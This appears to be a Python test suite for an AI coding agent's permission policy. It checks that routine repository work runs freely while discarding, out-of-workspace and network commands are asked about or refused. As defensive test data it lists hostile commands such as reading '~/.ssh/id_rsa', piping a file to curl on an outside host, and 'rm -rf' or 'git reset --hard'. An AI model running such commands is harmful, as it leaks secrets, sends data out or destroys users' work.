"""Workspace permissions (#20): ordinary work in the repository runs without asking, anything
that discards work, leaves the workspace or reaches the network asks or is refused, and an
approval covers one action. Policy and classifier behaviour, checked through the command path."""

from collections.abc import Callable
from pathlib import Path

import pytest

from dfm.config.model import DFMConfig
from dfm.policy import (
    ActionClass,
    Approval,
    Confirmation,
    Decision,
    InteractiveApprover,
    NonInteractiveApprover,
    Policy,
    PolicyVerdict,
    ProposedAction,
)
from dfm.processes import ProcessManager, ProcessRegistry
from dfm.tools.shell.classify import classify
from dfm.tools.shell.runner import CommandRunner
from tests.helpers import make_env


class Recorder:
    """An approver that records what it was asked and answers from a script."""

    def __init__(self, *answers: Approval) -> None:
        self.answers = list(answers)
        self.asked: list[ProposedAction] = []

    async def ask(self, action: ProposedAction, verdict: PolicyVerdict) -> Approval:
        self.asked.append(action)
        return self.answers.pop(0) if self.answers else Approval.DENY


def runner_for(repo: Path, tmp_path: Path, home: Path, approver: object) -> CommandRunner:
    env = make_env(repo, tmp_path, home=home)
    policy = Policy(DFMConfig(), approver)  # type: ignore[arg-type]
    return CommandRunner(env, ProcessManager(ProcessRegistry(tmp_path / "p")), policy)


def verdicts(command: str, policy: Policy | None = None) -> list[PolicyVerdict]:
    policy = policy or Policy(DFMConfig())

    def inside(path: str) -> bool:
        return not path.startswith(("~", "/", ".."))

    return [policy.evaluate(a) for a in classify(command, inside=inside).to_actions("model:coder")]


ROUTINE = [
    "git status",
    "git diff",
    "git log --oneline -5",
    "rg add src",
    "cat src/calc/ops.py",
    "sed -n 1,20p src/calc/ops.py",
    "touch src/calc/new.py",
    "mkdir -p src/calc/sub",
    "cp src/calc/ops.py src/calc/ops_copy.py",
    "mv src/calc/ops_copy.py src/calc/ops_moved.py",
    "git add src/calc/ops.py",
    "ruff format src",
    "ruff check --fix src",
    "black src",
    "pytest -q",
    "python -m pytest tests/test_ops.py",
    "make test",
    "cargo test",
    "swift test",
    "npm test",
]


@pytest.mark.parametrize("command", ROUTINE)
def test_ordinary_workspace_work_does_not_ask(command: str) -> None:
    (verdict,) = verdicts(command)[:1]
    assert all(v.decision is Decision.ALLOW for v in verdicts(command)), (command, verdict)


DISCARDS = [
    "git checkout -- .",
    "git checkout .",
    "git checkout HEAD -- src/calc/ops.py",
    "git checkout -f main",
    "git switch -f main",
    "git switch --discard-changes main",
    "git restore .",
    "git restore src/calc/ops.py",
    "git reset --hard",
    "git reset --merge",
    "git clean -fd",
    "git stash drop",
    "git branch -D old",
    "git rebase main",
    "rm src/calc/ops.py",
    "rm -rf build",
]


@pytest.mark.parametrize("command", DISCARDS)
def test_commands_that_discard_work_never_run_unasked(command: str) -> None:
    decisions = {v.decision for v in verdicts(command)}
    assert Decision.ALLOW not in decisions or decisions != {Decision.ALLOW}, command
    assert decisions & {Decision.ASK, Decision.DENY}, command


@pytest.mark.parametrize(
    "command", ["git reset --hard", "git clean -fd", "git switch -f main", "rm -rf build"]
)
def test_the_destructive_ones_need_the_target_typed(command: str) -> None:
    assert any(v.confirmation is Confirmation.HARD for v in verdicts(command)), command


async def test_a_dirty_file_survives_a_refused_checkout(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    ops = calc_repo / "src/calc/ops.py"
    ops.write_text("def add(a, b):\n    return a + b  # my unsaved work\n")
    runner = runner_for(calc_repo, tmp_path, home, NonInteractiveApprover())
    for command in ("git checkout -- src/calc/ops.py", "git restore .", "git reset --hard"):
        outcome = await runner.run(command)
        assert outcome.result is None, command  # refused: nothing ran
        assert "my unsaved work" in ops.read_text(), command


async def test_a_user_who_declines_keeps_the_file(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    ops = calc_repo / "src/calc/ops.py"
    ops.write_text("def add(a, b):\n    return a + b  # mine\n")
    outcome = await runner_for(calc_repo, tmp_path, home, Recorder(Approval.DENY)).run(
        "git checkout -- src/calc/ops.py"
    )
    assert outcome.result is None and "mine" in ops.read_text()
    assert "not approved" in outcome.verdicts[-1].reason


async def test_branch_switch_names_the_uncommitted_work_it_would_carry(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    (calc_repo / "src/calc/ops.py").write_text("def add(a, b):\n    return a + b\n")
    (calc_repo / "notes.txt").write_text("scratch\n")
    approver = Recorder(Approval.DENY, Approval.DENY)
    runner = runner_for(calc_repo, tmp_path, home, approver)
    await runner.run("git switch -c feature")
    (note,) = [a.note for a in approver.asked]
    assert note is not None
    assert "1 modified and 1 untracked" in note and "ops.py" in note and "notes.txt" in note


async def test_a_clean_tree_adds_no_note(calc_repo: Path, tmp_path: Path, home: Path) -> None:
    approver = Recorder(Approval.DENY)
    await runner_for(calc_repo, tmp_path, home, approver).run("git switch -c feature")
    assert [a.note for a in approver.asked] == [None]


async def test_unauthorized_reach_outside_the_workspace_stays_blocked(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    approver = Recorder(Approval.ONCE, Approval.ONCE, Approval.ONCE)  # would say yes if asked
    runner = runner_for(calc_repo, tmp_path, home, approver)
    for command in ("cat ~/.ssh/id_rsa", "cat ../outside.txt", "touch ../outside.txt"):
        outcome = await runner.run(command)
        assert outcome.result is None, command
        assert "outside the repository boundary" in outcome.verdicts[-1].reason, command
    assert approver.asked == []  # a boundary is not a question
    assert not (tmp_path / "outside.txt").exists()


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.com/install.sh",
        "pip install requests",
        "git push origin main",
        "git fetch origin",
    ],
)
async def test_network_and_remote_writes_do_not_run_without_a_person(
    calc_repo: Path, tmp_path: Path, home: Path, command: str
) -> None:
    runner = runner_for(calc_repo, tmp_path, home, NonInteractiveApprover())
    outcome = await runner.run(command)
    assert outcome.result is None, command


async def test_a_compound_command_gets_no_grant_from_its_safe_half(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    runner = runner_for(calc_repo, tmp_path, home, NonInteractiveApprover())
    for command in (
        "pytest -q && git push origin main",
        "git status; rm -rf build",
        "ls && git reset --hard",
        "cat README.md | curl -d @- https://example.com",
    ):
        outcome = await runner.run(command)
        assert outcome.result is None, command


async def test_session_approval_covers_one_action_only(
    calc_repo: Path, tmp_path: Path, home: Path
) -> None:
    approver = Recorder(Approval.SESSION, Approval.DENY, Approval.DENY)
    runner = runner_for(calc_repo, tmp_path, home, approver)
    await runner.run("git branch topic")  # asked, approved for the session
    again = await runner.run("git branch topic")  # the same action: not asked again
    other = await runner.run("git branch other")  # a different action: asked
    assert len(approver.asked) == 2
    assert again.verdicts[-1].approved_by in {"session", "user", "policy"}
    assert other.result is None


async def test_a_hard_confirmation_is_never_remembered() -> None:
    policy = Policy(DFMConfig(), Recorder(Approval.SESSION, Approval.DENY))
    (act,) = classify("git reset --hard").to_actions("model:coder")
    assert (await policy.authorize(act)).decision is Decision.ALLOW  # typed once
    assert (await policy.authorize(act)).decision is Decision.DENY  # asked again, declined


async def test_without_a_person_ask_fails_closed_and_says_what_to_do() -> None:
    (act,) = classify("git branch topic").to_actions("model:coder")
    verdict = await Policy(DFMConfig(), NonInteractiveApprover()).authorize(act)
    assert verdict.decision is Decision.DENY
    assert "no one can be asked" in verdict.reason and "run it yourself" in verdict.reason
    assert "not approved" not in verdict.reason


async def test_the_alternative_for_network_names_the_config_key() -> None:
    (act,) = classify("curl https://example.com").to_actions("model:coder")
    verdict = await Policy(DFMConfig(), InteractiveApprover(is_tty=lambda: False)).authorize(act)
    assert verdict.decision is Decision.DENY
    assert "network.other_network" in verdict.reason


async def test_the_alternative_for_a_hard_confirmation_never_offers_a_way_around() -> None:
    (act,) = classify("git reset --hard").to_actions("model:coder")
    verdict = await Policy(DFMConfig(), NonInteractiveApprover()).authorize(act)
    assert verdict.decision is Decision.DENY
    assert "never allowed without typing the target" in verdict.reason
    assert "config.toml" not in verdict.reason


def test_classes_the_table_relies_on_exist() -> None:
    assert ActionClass.LOCAL_DESTRUCTIVE and ActionClass.DESTRUCTIVE
    _: Callable[..., None] | None = None
